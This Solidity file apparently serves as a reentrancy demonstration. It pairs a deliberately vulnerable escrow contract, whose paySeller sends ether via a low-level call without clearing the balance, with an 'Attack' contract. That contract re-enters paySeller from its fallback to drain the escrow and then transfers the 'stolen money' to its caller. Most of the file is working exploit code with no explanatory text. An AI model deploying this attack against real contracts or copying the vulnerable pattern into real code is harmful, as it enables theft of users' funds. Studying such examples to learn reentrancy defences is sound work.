// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

contract Escrow_client_1_vuln {
    mapping(address => uint) public buyersBalances;
    address public seller;

    constructor() {
        seller = msg.sender;
    }

    function addBuyerOffer() external payable {
        require(msg.value > 0, '** Offer price must be above zero **');
        buyersBalances[msg.sender] += msg.value;
    }

    function withdrawOffer() external {
        payable(msg.sender).transfer(buyersBalances[msg.sender]);
        buyersBalances[msg.sender] = 0;
    }

    function paySeller() external {
        uint bal = buyersBalances[msg.sender];
        require(bal > 0, '** Buyer offer must be larger than zero **');
        (bool sent, ) = msg.sender.call{value: bal}('');
        require(sent, '** Transaction failed to send Ether **');
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}


contract Attack {
    Escrow_client_1_vuln public escrowClient1Vuln;

    constructor(address vulnContractAddress) {
        escrowClient1Vuln = Escrow_client_1_vuln(vulnContractAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(escrowClient1Vuln).balance >= 1 ether) {
            escrowClient1Vuln.paySeller();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        escrowClient1Vuln.addBuyerOffer{value: 1 ether}();
        escrowClient1Vuln.paySeller();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function tranferStolenMoney() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
